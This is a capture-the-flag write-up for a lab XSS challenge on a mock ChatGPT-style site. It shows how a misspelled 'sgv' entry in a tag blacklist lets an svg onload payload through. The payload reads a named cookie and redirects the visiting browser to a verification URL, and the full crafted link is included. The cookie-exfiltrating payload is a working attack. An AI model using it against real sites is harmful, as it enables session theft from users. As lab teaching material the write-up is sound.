# Mission 1 ~ cross site scripting (XSS)


## Goal and instructions

People are worried [AI](https://web2.chall.necst.it/) will take over humankind. Personally, I think that's all bu****it. Can't even get an image of a bowl of rice without chopsticks...

To validate your solution, please submit an URL belonging to the domain `web2.chall.necst.it`, which, when opened in a browser:
- retrieves the value of cookie `aNrBwXC`, which is is already present in the cookie jar of the browser that will visit your URL (the developers were sloppy, and this cookie is not `HTTPOnly`). Pay attention to the fact that there are multiple cookies in the cookie jar: you need to submit only the value of `aNrBwXC`!
- submits it through a GET request to `https://chall.necst.it/challenges/web2/verify/[PERSONA_CODE]/[cookie]`, where `[cookie]` is the value of the cookie `aNrBwXC`

For example, if `document.cookie` is `aNrBwXC=th1s1ssupersecret`, your payload must perform a `GET` request to: `https://chall.necst.it/challenges/web2/verify/[PERSONA_CODE]/th1s1ssupersecret`.

If you are encountering issues with your payload, please notice that the administrators' browser is already logged in to https://chall.necst.it/, and that it actually needs to be logged in to submit a valid solution. Basically, you are also exploiting an intentional CSRF vulnerability in https://chall.necst.it/


## Web app structure

The website is structured as [ChatGPT](https://chatgpt.com).


## Code overview

Examining the source code, it can be seen that the `sanitize(string)` function cleans a string by verifying that it does not contain blacklisted words.
```php
def sanitize(string):
    blacklist = ['script', 'img', 'sgv']

    # Sanitize the name and comment
    # Now they won't be able to break my beautiful website
    while any('<' + word in string for word in blacklist):
        for word in blacklist:
            string = string.replace(f'<{word}', f'&lt;{word}')

    return string
```

If you read the blacklist carefully, you can see that the HTML tag **svg** is misspelled, `sgv`.

```php
blacklist = ['script', 'img', 'sgv']
```

If you write a message on the fake ChatGPT the url has the following structure: `https://web2.chall.necst.it/chat?query=`


## Solution

To complete the exploit, you need to follow the following steps:

1. Determine how to get the required cookie.
   ```javascript
   document.cookie.split(';').map((c) => c.trim()).filter((c) => c.split('=')[0] == 'aNrBwXC').map((c) => c.split('=')[1])[0]
   ```
3. Write the tag with the correct attributes to perform the exploit.
   ```html
   <svg href="" onload="window.location.replace('https://chall.necst.it/challenges/web2/verify/5682/'.concat(document.cookie.split(';').map((c) => c.trim()).filter((c) => c.split('=')[0] == 'aNrBwXC').map((c) => c.split('=')[1])[0]))">
   ```
4. Enter the previously written tag in the message to be sent to the fake ChatGPT, copy the url and enter it into the verification platform.
   ```https
   https://web2.chall.necst.it/chat?query=<svg href="" onload="window.location.replace('https://chall.necst.it/challenges/web2/verify/5682/'.concat(document.cookie.split(';').map((c) => c.trim()).filter((c) => c.split('=')[0] == 'aNrBwXC').map((c) => c.split('=')[1])[0]))">
   ```
